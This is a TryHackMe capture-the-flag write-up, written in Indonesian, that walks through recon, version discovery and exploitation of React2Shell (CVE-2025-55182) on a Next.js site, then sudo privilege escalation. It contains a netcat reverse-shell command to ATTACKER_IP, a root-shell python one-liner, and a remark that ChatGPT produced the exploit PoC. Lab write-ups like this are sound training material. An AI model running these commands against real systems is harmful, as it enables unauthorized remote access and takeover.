# Corp Website — TryHackMe Writeup

**Target:** Corp Website  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Kategori:** Web Enumeration, Next.js, React2Shell, Remote Code Execution, Privilege Escalation

---

## Recon

Seperti biasa dimulai dengan Rustscan untuk melakukan port scanning.

```bash
rustscan -b 500 --scripts none -t 5000 -a TARGET_IP
```

Dilanjutkan dengan Nmap untuk melakukan enumerasi service.

```bash
nmap -sC -sV -T4 -p22,3000 TARGET_IP
```

![port](images/port.png)

Website berjalan di port 3000 dan menggunakan Next.js.

---

## Web Enumeration

Setelah melihat source HTML, saya menemukan beberapa komponen yang menunjukkan bahwa website menggunakan **Next.js + React**, seperti:

```text
self.__next_f.push([1,"..."])

1:"$Sreact.fragment"
```

Karena sudah mengetahui stack yang digunakan, saya menggunakan Feroxbuster dengan extension `.js` untuk melakukan web content enumeration dan mencari file atau endpoint JavaScript yang dapat memberikan informasi tambahan mengenai stack tersebut.

```bash
feroxbuster -w ~/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -d 3 -u http://TARGET_IP:3000/ -x js
```

![ferox](images/ferox.png)

Dari hasil crawling Feroxbuster, saya menemukan informasi versi:

```text
r.version="19.3.0-canary-52684925-20251110"
window.next={version:"16.0.6"
```

Dari informasi tersebut diketahui bahwa stack yang digunakan adalah:

```text
React: 19.3.0-canary-52684925-20251110
Next.js: 16.0.6
```

Setelah mencari informasi mengenai versi tersebut, saya menemukan bahwa stack yang digunakan berkaitan dengan vulnerability **React2Shell (CVE-2025-55182)**.

Setelah mengonfirmasi bahwa versi yang digunakan sesuai dengan vulnerability tersebut, saya meminta ChatGPT untuk membantu membuat PoC exploit dan menggunakannya untuk menguji apakah arbitrary command execution dapat dilakukan.

![testing](images/testing.png)

Exploit berhasil dan arbitrary command execution dapat dilakukan pada target.

---

## Initial Foothold — React2Shell

Setelah mengonfirmasi bahwa exploit berhasil, saya langsung mencoba mendapatkan reverse shell.

Target ternyata menggunakan `sh` sebagai shell, sehingga payload yang digunakan adalah:

```bash
python exploit.py -t http://TARGET_IP:3000/ -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 9004 >/tmp/f"
```

Setelah menjalankan payload tersebut, saya berhasil mendapatkan shell pada target.

---

## Privilege Escalation — Sudo

Setelah mendapatkan shell, saya mengecek privilege sudo menggunakan:

```bash
sudo -l
```

Hasilnya menunjukkan bahwa user `daniel` dapat menjalankan `/usr/bin/python3` sebagai root.

Karena Python dapat dijalankan dengan privilege root, saya menggunakan payload berikut untuk mendapatkan shell:

```bash
python3 -c 'import os; os.system("/bin/sh")'
```

Payload berhasil dieksekusi dan saya mendapatkan root shell.

![root](images/root.png)

